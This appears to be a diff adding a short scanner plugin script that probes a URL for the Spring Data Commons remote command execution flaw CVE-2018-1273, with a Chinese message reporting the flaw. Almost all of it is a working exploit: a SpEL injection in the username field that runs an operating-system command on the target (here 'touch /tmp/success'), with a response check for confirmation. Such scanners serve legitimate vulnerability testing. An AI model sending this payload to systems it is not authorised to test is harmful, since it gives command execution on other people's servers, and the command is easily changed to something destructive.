@@ -1,0 +1,14 @@
+#request url = var
+#define payload =/users?page=&size=5
+#define bug = Getter for property 
+#define info = 存在Spring Data Commons 远程命令执行漏洞（CVE-2018-1273）
+#define post = username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("touch /tmp/success")]=&password=&repeatedPassword=
+
+function main(args)
+{
+	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
